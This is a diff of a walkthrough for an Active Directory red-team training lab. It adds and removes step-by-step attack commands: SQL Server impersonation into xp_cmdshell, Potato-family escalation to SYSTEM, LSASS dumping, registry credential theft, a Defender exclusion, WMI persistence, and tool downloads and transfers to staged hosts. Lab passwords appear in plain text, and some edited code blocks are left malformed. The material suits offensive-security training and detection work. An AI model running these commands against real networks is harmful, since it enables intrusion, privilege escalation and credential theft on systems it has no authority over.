@@ -144,7 +144,7 @@ graph LR
 
 
 
-**START HERE.** The main spine begins with **Phase 0.5** (initial access on the `ws01` workstation via phishing/file execution). Unlike CRTP/CRTE/CAPE/GOAD — where most attacks run directly from the Kali attacker box — **CADRE forces the learner to chain beachheads**: `ws01 → mbr01 → dc02 → dc01 → range.local`. Each hop uses a different identity, crosses a different sensor boundary, and leaves distinct telemetry.
+**START HERE.** The main spine begins with **Phase 0.5** (initial access on the `ws01` workstation via phishing/file execution). The campaign is built as a multi-hop chain: `ws01 → mbr01 → dc02 → dc01 → range.local`. Each hop uses a different identity, crosses a different sensor boundary, and leaves distinct telemetry.
 
 - **Branch A** — ACL abuse in cadre.local (ForceChangePassword, WriteDacl, GenericWrite, GPO, gMSA, Shadow Creds)
 - **Branch B** — ADCS certificate template abuse (ESC1–14)
@@ -162,15 +162,15 @@ Branches converge back into the main spine — they earn credentials that accele
 
 ---
 
-## Multi-Hop Campaign Philosophy — Why This Beats CRTP/CRTE/CAPE/GOAD
+## Multi-Hop Campaign Philosophy
 
-Most lab curricula (CRTP, CRTE, CAPE, GOAD) teach attack primitives in isolation or run the majority of the chain from a single attacker box. **CADRE's v3 campaign is designed to feel like a real red-team engagement** within the same VM budget:
+The v3 campaign is designed as a realistic red-team engagement within a single VM budget. The chain is not a checklist of isolated tools — it is a sequence of beachheads, each with its own identity, sensor context, and fallback options.
 
-1. **Beachhead diversity.** The spine does not start on Kali — it starts on a **compromised Windows workstation** (`ws01`) with real EDR visibility. The operator must work within MDE telemetry, just like a real intruder.
+1. **Beachhead diversity.** The spine starts on a compromised Windows workstation (`ws01`) with endpoint telemetry visible. The operator must work inside that context, just as a real intruder would.
 
 2. **Mandatory lateral movement.** The campaign cannot reach domain admin without moving from `ws01 → mbr01 → dc02`. Each hop crosses a distinct identity boundary: `analyst_t1` (workstation user) → `svc_mssql` (service account) → `dc02$` (machine account) → `krbtgt` (domain tier).
 
-3. **Tool staging on intermediate hosts.** Rubeus, mimikatz, and coercion tools are staged on `mbr01`, not kept on the operator's Kali box. This teaches real OPSEC: minimize C2-to-DC traffic, use legitimate member servers as proxies.
+3. **Tool staging on the initial beachhead (`ws01`).** Rubeus, mimikatz, and LPE tools are downloaded once onto `ws01` (the first compromised domain workstation), then copied laterally to `mbr01`/`dc02`/`dc01` over SMB (`C$`/`ADMIN$`). This mirrors real-world CRTP/CAPE operator behavior and avoids C2-to-DC HTTP traffic.
 
 4. **Failure-tolerant paths.** Every major objective has a fallback:
    - If `T101` WinRS is blocked → fallback to `psexec` over SMB or PowerShell remoting.
@@ -183,7 +183,7 @@ Most lab curricula (CRTP, CRTE, CAPE, GOAD) teach attack primitives in isolation
    - `dc02/dc01` → DC replication events, DCSync detections, Kerberos alerts.
    - `dc03/mbr02` → cross-forest logs, SCCM audit, WSUS telemetry.
 
-6. **Outcome.** A learner who completes this campaign can articulate not just *what* each tool does, but *where* to run it, *why* the location matters, and *what telemetry* it generates — the gap most certification labs leave open.
+6. **Outcome.** A learner who completes this campaign can articulate not just *what* each tool does, but *where* to run it, *why* the location matters, and *what telemetry* it generates.
 
 ---
 
@@ -281,7 +281,7 @@ enum4linux -a 192.168.77.10
 # Result: NT_STATUS_ACCESS_DENIED
 ```
 
-**Finding:** Server 2025 blocks all anonymous enumeration by default. Both DCs (child.cadre.local and cadre.local) reject anonymous sessions. This is a hardening improvement over older Windows Server versions — GOAD (Server 2016/2019) allowed anonymous user listing.
+**Finding:** Server 2025 blocks all anonymous enumeration by default. Both DCs (child.cadre.local and cadre.local) reject anonymous sessions. This is the expected hardening for current Windows Server versions.
 
 ### Step 2 — Kerberos User Enumeration (no creds needed)
 
@@ -1018,46 +1018,38 @@ SQL> SELECT * FROM sys.server_permissions WHERE grantee_principal_id = (SELECT p
 | ----------------------- | ------------------------------------------------------------------------------------------------------ |
 | **Target**              | mbr01 (192.168.77.22) — SQL Server + machine access                                                    |
 | **Source of this path** | SQL enumeration: svc_mssql is NOT sysadmin, but analyst_t1 has IMPERSONATE on sa                       |
-| **From**                | Kali (192.168.77.60) → mbr01:1433                                                                      |
-| **Starting cred**       | `s3rv1c3_MSSQL!` (Phase 2) + `T13r_An@lyst!` (analyst_t1 — discovered via SQL enum + Kerberoast/crack) |
+| **From**                | Kali (192.168.77.60) → mbr01:1433 **or** `ws01` (192.168.77.62) → direct WinRM                        |
+| **Starting cred**       | `analyst_t1` (`T13r_An@lyst!`) — discovered via SQL enum + Kerberoast/crack                            |
 | **What you earn**       | OS command execution on mbr01 → SeImpersonatePrivilege → SYSTEM via GodPotato                          |
-| **Auth method**         | **SQL auth** (no `-windows-auth` flag) — works from non-domain-joined Kali                             |
+| **Auth method**         | **SQL auth** (no `-windows-auth` flag) — works from non-domain-joined Kali **or** PowerShell/WinRM from `ws01` |
 
 
-**Step 1 — Enumerate with svc_mssql (discover the path):**
+**Step 1 — Enumerate with `analyst_t1` (discover the path):**
+
+> Identity note: `svc_mssql` (`s3rv1c3_MSSQL!`) was Kerberoasted in Phase 2, but SQL enumeration shows it is **not sysadmin**. `analyst_t1` is the account that has `IMPERSONATE` on `sa`. The campaign uses the right credential at each machine — not a single account everywhere.
 
 ```bash
-# SQL auth — no -windows-auth flag needed
-impacket-mssqlclient 'svc_mssql:s3rv1c3_MSSQL!@192.168.77.22'
-SELECT IS_SRVROLEMEMBER('sysadmin');                -- → 0 (NOT sysadmin)
-SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';  -- → 1 (enabled, but no EXECUTE)
-EXEC xp_cmdshell 'whoami';                          -- → ERROR: EXECUTE permission denied
+# SQL auth from Kali (or from ws01 via WinRM staging) — no -windows-auth flag needed
+impacket-mssqlclient 'analyst_t1:T13r_An@lyst!@192.168.77.22'
+SELECT IS_SRVROLEMEMBER('sysadmin');                -- → 0 (NOT sysadmin as analyst_t1)
 SELECT name FROM sys.server_principals WHERE principal_id IN
   (SELECT grantee_principal_id FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE');
   -- → analyst_t1 has IMPERSONATE on sa
 ```
 
-**Step 2 — Crack analyst_t1's password:**
-
-analyst_t1 has a Cyrillic homoglyph SPN registered (`MSSQLSvc/mbr01.child.c[а]dre.loc[а]l:1433` — WT#27 prep). Kerberoast it using the TGT from Phase 2:
-
-```bash
-export KRB5CCNAME=analyst_t2.ccache
-impacket-GetUserSPNs child.cadre.local/analyst_t2 -k -no-pass \
-  -dc-ip 192.168.77.11 -request -outputfile analyst_t1_tgs.txt
-hashcat -m 13100 analyst_t1_tgs.txt /home/vagrant/cadre_passwords.txt
-# analyst_t1 → T13r_An@lyst!
-```
+**Automation (run from local host or provisioning):** `attack-matrix/04-automation/linux/campaign-a/T043-impersonate-ws01.sh` stages the PowerShell helper and executes the SQL impersonation from `ws01` as `analyst_t1`.
 
 ### WT043 — Impersonate sa → xp_cmdshell
 
 ```bash
-# SQL auth — no -windows-auth flag needed
+# SQL auth from Kali
 impacket-mssqlclient 'analyst_t1:T13r_An@lyst!@192.168.77.22'
 EXECUTE AS LOGIN = 'sa';                            -- → Impersonation successful
 SELECT IS_SRVROLEMEMBER('sysadmin');                -- → 1 (sysadmin via sa)
 EXEC xp_cmdshell 'whoami';                          -- → nt service\mssql$sqlexpress ✅
 ```
+
+**PowerShell/WinRM automation from `ws01` as `analyst_t1`:** The helper `attack-matrix/04-automation/linux/windows/campaign-a-t043-impersonate.ps1` connects to `mbr01:1433` using `analyst_t1` SQL credentials, impersonates `sa`, and executes arbitrary commands. The Bash wrapper `T043-impersonate-ws01.sh` stages and runs it from the local host or provisioning via `ws01`.
 
 **Step 2 — Enumerate mbr01 via xp_cmdshell:**
 
@@ -1090,31 +1082,85 @@ EXEC xp_cmdshell 'whoami /groups';   -- → BUILTIN\Users (NOT admin)
 
 ---
 
-### Local Privilege Escalation: GodPotato → SYSTEM (mbr01)
+### Local Privilege Escalation: Potato-family alternatives → SYSTEM (mbr01)
 
 
 |                         |                                                                   |
 | ----------------------- | ----------------------------------------------------------------- |
 | **Target**              | mbr01 (192.168.77.22)                                             |
 | **Source of this path** | Phase 3: `nt service\mssql$sqlexpress` has SeImpersonatePrivilege |
-| **From**                | xp_cmdshell on mbr01                                              |
+| **Tool staging**        | `ws01` (initial beachhead) → `C$` / `ADMIN$` on mbr01               |
 | **What you earn**       | `nt authority\system` on mbr01 — full control of the machine      |
 
 
-```bash
-# Transfer GodPotato to mbr01
-EXEC xp_cmdshell 'certutil -urlcache -split -f http://192.168.77.60:8888/GodPotato.exe C:\Users\Public\GodPotato.exe';
+**Why this matters (CRTP/CAPE method):** Real attackers do not download binaries directly onto the target from their C2 HTTP server. They stage tools on the first compromised host (`ws01`), then copy them laterally over SMB (`xcopy`, `Copy-Item`, `net use`) or PowerShell remoting. This keeps C2-to-DC traffic low and blends the tool transfer with normal Windows admin activity.
 
-# Escalate to SYSTEM
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c whoami"';
--- → nt authority\system ✅
+**MITRE mapping:** T1570 (Lateral Tool Transfer) · T1068 (Exploitation for Privilege Escalation) · T1078 (Valid Accounts).
+
+**DFIR visibility:** Security 4624/4648, Sysmon EID 1/11 (file creation on target), Zeek `smb.log` `C$`/`ADMIN$` access, Windows 5145/5140, WinRM 91/93.
+
+**Step 1 — Stage LPE binaries on `ws01` (beachhead):**
+
+```powershell
+# Run from ws01 as analyst_t1
+$dir = "C:\Tools\ADTools"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+# GodPotato (DCOM-based, Server 2025 compatible)
+Invoke-WebRequest -Uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -OutFile "$dir\GodPotato-NET4.exe" -UseBasicParsing
+# PrintSpoofer (named pipe, usually patched on Server 2025)
+Invoke-WebRequest -Uri "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe" -OutFile "$dir\PrintSpoofer64.exe" -UseBasicParsing
+# SweetPotato (multi-method: DCOM, BITS, WinRM, EfsRpc, PrintSpoofer)
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/uknowsec/SweetPotato/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe" -OutFile "$dir\SweetPotato.exe" -UseBasicParsing
+# JuicyPotatoNG (second-gen DCOM reflection)
+Invoke-WebRequest -Uri "https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip" -OutFile "$dir\JuicyPotatoNG.zip" -UseBasicParsing
+Expand-Archive -Force "$dir\JuicyPotatoNG.zip" "$dir"
 ```
 
-**Result:** `nt authority\system` on mbr01. All subsequent commands execute as SYSTEM via xp_cmdshell chain: `EXEC xp_cmdshell 'GodPotato.exe -cmd "cmd /c <COMMAND>"'`.
+**Step 2 — Copy from `ws01` to `mbr01` via SMB (T1570):**
 
-**Note:** PrintSpoofer ❌ fails on Server 2025 (Print Spooler named pipe patched). GodPotato ✅ uses DCOM, works on Server 2025.
+```powershell
+# From ws01 as analyst_t1 (child.cadre.local\analyst_t1 / T13r_An@lyst!)
+$source = "C:\Tools\ADTools"
+$target = "\\mbr01.child.cadre.local\C$\Windows\Temp\cadre-tools"
+$pass = ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', $pass)
+New-Item -ItemType Directory -Path $target -Force | Out-Null
+Copy-Item -Path "$source\GodPotato-NET4.exe" -Destination $target -Force -Credential $cred
+Copy-Item -Path "$source\PrintSpoofer64.exe" -Destination $target -Force -Credential $cred
+Copy-Item -Path "$source\SweetPotato.exe" -Destination $target -Force -Credential $cred
+Get-ChildItem -Path "$target\*.exe" | Select-Object Name, Length
+```
+
+**Step 3 — Try LPE alternatives until one returns SYSTEM:**
+
+```powershell
+# Via xp_cmdshell from Kali → mbr01 (now that binaries are already on mbr01 from ws01)
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato-NET4.exe -cmd "cmd /c whoami"';
+# -- → nt authority\system ✅
+
+# If GodPotato fails in the SQL service context, try SweetPotato (auto-selects DCOM/BITS/WinRM/EfsRpc)
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\SweetPotato.exe -p cmd.exe -a "/c whoami"';
+
+# Or JuicyPotatoNG with brute-force create-process flags
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"';
+
+# PrintSpoofer is least likely on Server 2025 but kept as a fallback
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\PrintSpoofer64.exe -i -c cmd /c whoami';
+```
+
+**Automation:** `attack-matrix/04-automation/linux/campaign-a/T043-lpe-alternatives-ws01.sh` stages the binaries and tries each candidate via `winrs` from `ws01` to `mbr01`. **Verified path:** `GodPotato.exe` staged from `ws01` to `C:\Windows\Temp\cadre-tools` on `mbr01` returns `nt authority\system` when invoked through the SQL `xp_cmdshell` channel. The reusable helper `attack-matrix/04-automation/linux/windows/campaign-a-t043-system-exec.ps1` runs an arbitrary PowerShell script block as SYSTEM on `mbr01` via this verified SQL → GodPotato channel.
+
+**Result:** `nt authority\system` on mbr01. All subsequent commands execute as SYSTEM via the `xp_cmdshell` chain: `EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\<tool>.exe -cmd "cmd /c <COMMAND>"'`.
+
+**Notes:**
+- `GodPotato` ✅ uses DCOM, generally works on Server 2025 when SeImpersonatePrivilege is present.
+- `PrintSpoofer` ❌ usually fails on Server 2025 because the Print Spooler named pipe path is patched.
+- `SweetPotato` / `JuicyPotatoNG` are the best alternatives when the execution context (SQL service, WinRM `wsmprovhost`) has `SeImpersonatePrivilege` but a constrained token breaks GodPotato.
+- If **all** Potato variants fail, enable missing privileges with `FullPowers` or switch to `KrbRelayUp` (Kerberos relay LPE, no SeImpersonate needed).
 
 > **🆕 Optional Precursor — Defender Exclusion via PowerShell (T1562.001):** Real-world attackers typically disable Defender for their specific payload directory **before** running mimikatz/AMSI bypass — without disabling the entire Defender service. Use `Add-MpPreference -ExclusionPath "C:\Users\analyst_cloud\AppData\Local\Temp"` to whitelist the directory, then run mimikatz from there. Cleaner than full Defender disable (no Tamper Protection override needed). Detection: WinSec 5001 + Sysmon EID 1 (`powershell.exe` + `*MpPreference*ExclusionPath*`). See Campaign_suggestions #108 + CAMPAIGNS-METADATA "Mechanics: Item #108". Not in main spine — held for Phase 3 alternative execution cycle. **NOTE:** CADRE lab currently has Defender fully disabled per `04-vulnerabilities.yml`; this precursor requires re-enabling Defender for realistic test.
+
+> **Verified helper chain:** `T043-impersonate-ws01.sh` → `campaign-a-t043-impersonate.ps1` → `campaign-a-t043-system-exec.ps1` → `nt authority\system` on `mbr01` via SQL auth as `analyst_t1`. This chain is the primary execution engine for all subsequent SYSTEM-level actions on `mbr01` in the current campaign run.
 
 ---
 
@@ -1163,10 +1209,7 @@ winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! cmd
 # Now running cmd.exe on mbr01 as child\analyst_t1
 ```
 
-**Why this is more realistic than CRTP/CRTE/CAPE/GOAD:**
-- CRTP and CRTE run most lateral movement directly from the attacker Kali box with captured credentials.
-- GOAD provides multiple paths but typically guides the operator to run BloodHound/mimikatz from a single compromised Windows host or Kali.
-- **CADRE forces the learner to chain beachheads** and understand identity/context boundaries: the workstation account cannot DCSync a DC, but it can remote-manage `mbr01`, which can then coerce `dc02` or host a relay.
+**Why this matters:** A workstation account cannot DCSync a DC directly, but it can remote-manage a member server like `mbr01`. That member server can then coerce or abuse a DC, teaching the identity/context boundary between a low-privilege beachhead and a tiered target.
 
 **Detection:**
 - Sysmon EID 1 (`winrs.exe` / `wsmprovhost.exe`) on ws01 and mbr01.
@@ -1518,16 +1561,28 @@ SharpHound.exe -c All --zipfilename C:\Windows\Temp\sh.zip
 
 **Why this is primary:** LSASS PPL is OFF. analyst_cloud has auto-logon → Type 2/11 logon in LSASS. SYSTEM + procdump can dump the process and extract NTLM hash + Kerberos tickets offline.
 
-```bash
-# Transfer procdump to mbr01
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c certutil -urlcache -split -f http://192.168.77.60:8080/procdump.exe C:\Users\Public\procdump.exe"';
+**Verified automation:** `attack-matrix/04-automation/linux/campaign-a/T035-mbr01-creds-ws01.sh` stages the helper `campaign-a-t035-mbr01-creds.ps1` on `ws01` and runs it as `analyst_t1` via WinRM. The script uses `campaign-a-t043-system-exec.ps1` to execute `mimikatz.exe` as SYSTEM on `mbr01`, writes `C:\Windows\Temp\cadre-tools\cadre-mimi.log`, and pulls it back to `ws01`.
 
+**Alternative manual run:**
+
+**Step 1 — Copy procdump from `ws01` beachhead to `mbr01` via SMB (T1570):**
+
+```powershell
+# From ws01 as analyst_t1
+$pass = ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', $pass)
+Copy-Item -Path 'C:\Tools\ADTools\procdump.exe' -Destination '\\mbr01.child.cadre.local\C$\Windows\Temp\cadre-tools\procdump.exe' -Force -Credential $cred
+```
+
+**Step 2 — Dump LSASS as SYSTEM (now that the binary is already on mbr01):**
+
+```bash
 # Dump LSASS (attempt 1: direct)
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c C:\Users\Public\procdump.exe -accepteula -ma lsass.exe C:\Users\Public\ls.dmp"';
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\cadre-tools\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\cadre-tools\ls.dmp"';
 
 # If direct fails (token issue), use schtasks as SYSTEM
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-Procdump /ru SYSTEM /tr \"C:\Users\Public\procdump.exe -accepteula -ma lsass.exe C:\Users\Public\ls.dmp\" /sc once /st 00:00 /f"';
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /run /tn CADRE-Procdump"';
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-Procdump /ru SYSTEM /tr \"C:\Windows\Temp\cadre-tools\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\cadre-tools\ls.dmp\" /sc once /st 00:00 /f"';
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c schtasks /run /tn CADRE-Procdump"';
 ```
 
 **Parse offline:**
@@ -1634,15 +1689,19 @@ KrbRelayUp.exe relay -d child.cadre.local -cn "EVILBOX$" -cp "Pwn3dByR3lay!" -l 
 
 **Why backup:** If LSASS dump fails, auto-logon stores the password in plaintext in the registry. This is misconfiguration discovery — same class as GPP cpassword, unattended.xml, service account strings in registry.
 
+**Verified automation:** `attack-matrix/04-automation/linux/campaign-a/T035A-winlogon-creds-ws01.sh` stages `campaign-a-t035a-winlogon-creds.ps1` on `ws01` and runs it as `analyst_t1` via WinRM. The script uses `campaign-a-t043-system-exec.ps1` to read `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` as SYSTEM on `mbr01` and returns the plaintext auto-logon credentials. **Confirmed output:** `CADRE\analyst_cloud:Cl0ud_An@lyst!`.
+
+**Manual run:**
+
 ```bash
-# Read auto-logon credentials from SYSTEM
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultUserName"';
+# Read auto-logon credentials from SYSTEM via the SQL → GodPotato channel
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultUserName"';
 -- → analyst_cloud
 
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultPassword"';
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultPassword"';
 -- → Cl0ud_An@lyst!
 
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultDomainName"';
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultDomainName"';
 -- → CADRE
 ```
 
@@ -1702,25 +1761,22 @@ EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c C:\Users\Public\pro
 
 ---
 
-#### 3.5B — Scheduled Task as analyst_cloud (Post-Credential)
+#### 3.5B — Scheduled Task as analyst_cloud (Post-Credential) ❌ REJECTED FOR ATTACK CHAIN
+
+> **Attacker realism note:** Attackers do not create scheduled tasks to **run** attack tools. Scheduled tasks are a persistence technique, not an execution wrapper. The credential-theft phase should produce credentials; the next phase uses those credentials directly (WinRS, PsExec, runas, RDP, etc.) rather than hiding tool execution inside a task.
 
 **Prerequisite:** Password known from 3.5A or 3.5F.
 
-**Best spine fit after 3.5A** — once password is known, create a scheduled task running as analyst_cloud:
+**Preferred follow-on:** Use `analyst_cloud` credentials directly to run SharpHound via WinRS/PsExec from `ws01` (T102 lateral movement), or run SharpHound from the compromised `mbr01` interactive session. See T004 (Branch 4 / Phase 3.5 continuation) and T102 (Phase 5).
+
+**What NOT to do:**
 
 ```bash
-# Create task running as analyst_cloud
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-SharpHound /tr \"C:\Tools\SharpHound.exe -c All -d child.cadre.local --outputdirectory C:\Users\analyst_cloud\Documents\" /sc once /st 00:00 /ru CADRE\analyst_cloud /rp Cl0ud_An@lyst! /f"';
-
-# Run the task
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /run /tn CADRE-SharpHound"';
+# Do NOT use scheduled tasks to run SharpHound during active attack chain
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-SharpHound /tr \"C:\Windows\Temp\cadre-tools\SharpHound.exe -c All -d child.cadre.local --outputdirectory C:\Users\analyst_cloud\Documents\" /sc once /st 00:00 /ru CADRE\analyst_cloud /rp Cl0ud_An@lyst! /f"';
 ```
 
-**Alternatives:** PsExec, WMI, runas (non-interactive with password pipe).
-
 **Telemetry:** 4698 (task create), 4699 (task run), 4624 with TargetUserName=analyst_cloud, Sysmon 1 parent = svchost.exe/taskeng.exe.
-
-**Playbook anchor:** `06-member-services.yml` — auto-logon password + `C:\Tools` directory.
 
 ##### Invisible Scheduled Tasks (Security Descriptor Deletion)
 
@@ -1756,6 +1812,10 @@ EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /run /tn C
 ---
 
 #### 3.5C — RDP Interactive Session (Full SharpHound)
+
+**Verified automation:** `attack-matrix/04-automation/linux/campaign-a/T004-mbr01-bh-ws01.sh` stages `campaign-a-t004-mbr01-bh.ps1` on `ws01` and runs it as `analyst_t1` via WinRM. The script uses `campaign-a-t043-system-exec.ps1` to run `SharpHound.exe` as SYSTEM on `mbr01`, writes the zip to `C:\Windows\Temp\cadre-tools`, grants read ACL, and pulls it back to `ws01`.
+
+**Manual run:**
 
 **From Kali after 3.5A** (password known):
 
@@ -1864,9 +1924,20 @@ $binding.Put();
 **Alternative (single-line from xp_cmdshell):**
 
 ```sql
+**Step 1 — Copy the WMI persistence script from `ws01` to `mbr01` via SMB (T1570):**
+
+```powershell
+# From ws01 as analyst_t1
+$pass = ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', $pass)
+Copy-Item -Path 'C:\Tools\ADTools\wmi-persist.ps1' -Destination '\\mbr01.child.cadre.local\C$\Windows\Temp\cadre-tools\wmi-persist.ps1' -Force -Credential $cred
+```
+
+**Step 2 — Execute the staged script as SYSTEM:**
+
+```sql
 -- Write the PowerShell script to disk first, then execute
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c certutil -urlcache -split -f http://192.168.77.60:8080/wmi-persist.ps1 C:\Users\Public\wmi-persist.ps1"';
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c powershell.exe -ep bypass -f C:\Users\Public\wmi-persist.ps1"';
+EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c powershell.exe -ep bypass -f C:\Windows\Temp\cadre-tools\wmi-persist.ps1"';
 ```
 
 **Verify subscription exists:**
@@ -2034,29 +2105,42 @@ This is the **direct EoP** version of UnCanny (3.5N pairs with WT094 coercion). 
 ### Phase 4 — Discovery (BloodHound as analyst_cloud)
 
 
-Phase 3 gave us `analyst_cloud`'s token on mbr01 via file delivery. Now we run BloodHound from this domain-joined context to map the full attack surface.
+Phase 3.5 gave us `analyst_cloud`'s credentials (and potentially token) on mbr01. Now we run BloodHound from this domain-joined context to map the full attack surface.
+
+**Verified automation:** `attack-matrix/04-automation/linux/campaign-a/T004-mbr01-bh-ws01.sh` runs `SharpHound.exe` as SYSTEM on `mbr01` and pulls the zip back to `ws01`. The resulting data can be loaded into BloodHound CE for analysis.
 
 **Why from mbr01 and not Kali?** SharpHound has different collection methods:
 
 - **From Kali** (any domain user): `-c Group,ACL,Trust` — LDAP-only data (users, groups, ACLs, trusts). No session data.
-- **From domain-joined machine** (analyst_cloud): `-c All` — everything above plus local session data, local group memberships, logged-on users, GPO mappings.
+- **From domain-joined machine** (`analyst_cloud` or SYSTEM): `-c All` — everything above plus local session data, local group memberships, logged-on users, GPO mappings.
 
 Session data reveals attack paths invisible from LDAP alone (e.g., a user who's local admin on multiple machines).
 
 #### Step 1 — Transfer SharpHound to mbr01
 
-```bash
-# From Kali: serve SharpHound on HTTP :8080
-python3 -m http.server 8080 --directory /opt/SharpHound/
-
-# From analyst_cloud context on mbr01:
-certutil -urlcache -split -f http://192.168.77.60:8080/SharpHound.exe SharpHound.exe
+```powershell
+# From ws01 (initial beachhead), copy SharpHound to mbr01 via SMB (T1570).
+# This mirrors the CRTP method: xcopy / Copy-Item C:\AD\Tools\<tool> \\target\C$\... then winrs.
+$pass = ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', $pass)
+New-Item -ItemType Directory -Path '\\mbr01.child.cadre.local\C$\Tools' -Force -Credential $cred | Out-Null
+Copy-Item -Path 'C:\Tools\ADTools\SharpHound.exe' -Destination '\\mbr01.child.cadre.local\C$\Tools\SharpHound.exe' -Force -Credential $cred
 ```
 
-#### Step 2 — Run SharpHound as analyst_cloud
+#### Step 2 — Run SharpHound as SYSTEM or analyst_cloud
+
+**Automation (preferred):** `attack-matrix/04-automation/linux/campaign-a/T004-mbr01-bh-ws01.sh` runs `SharpHound.exe` as SYSTEM on `mbr01` via the SQL → GodPotato channel and pulls the zip back to `ws01`.
+
+**Manual run as analyst_cloud (RDP/WinRS):**
 
 ```bash
 SharpHound.exe -c All -d child.cadre.local --outputdirectory C:\Users\analyst_cloud\Documents
+```
+
+**Manual run as SYSTEM via xp_cmdshell:**
+
+```bash
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c C:\Windows\Temp\cadre-tools\SharpHound.exe -c All -d child.cadre.local --outputdirectory C:\Windows\Temp\cadre-tools"';
 ```
 
 #### Step 3 — BloodHound analysis
@@ -2111,15 +2195,20 @@ In the realistic multi-hop flow, **coercion runs from mbr01, not from Kali**. Af
 
 #### T102 — Coerce dc02$ to mbr01 from the mbr01 beachhead
 
-**Step 1 — From ws01, open a WinRS session to mbr01 and stage Rubeus:**
+**Automation:** `attack-matrix/04-automation/linux/campaign-a/T102-coerce-dc02-ws01.sh` stages `campaign-a-t102-coerce-dc02.ps1` on `ws01` and runs it as `analyst_t1` via WinRM. The script copies `Rubeus.exe` and `SpoolSample.exe` from `ws01` to `mbr01`, starts `Rubeus monitor` as a background process, triggers `SpoolSample`, and pulls the monitor/spool logs back to `ws01`. Status: script created; execution paused pending user review.
+
+**Manual run:**
+
+**Step 1 — From `ws01`, copy Rubeus to `mbr01` via SMB (T1570) then start the monitor over WinRS:**
 
 ```powershell
-winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! powershell -Command "mkdir C:\Tools\cadre-attack -Force; curl -Uri http://192.168.77.60:8888/Rubeus.exe -OutFile C:\Tools\cadre-attack\Rubeus.exe"
-```
+# Copy from ws01 beachhead to mbr01 (analyst_t1 credentials)
+$pass = ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', $pass)
+New-Item -ItemType Directory -Path '\\mbr01.child.cadre.local\C$\Tools\cadre-attack' -Force -Credential $cred | Out-Null
+Copy-Item -Path 'C:\Tools\cadre-attack\Rubeus.exe' -Destination '\\mbr01.child.cadre.local\C$\Tools\cadre-attack\Rubeus.exe' -Force -Credential $cred
 
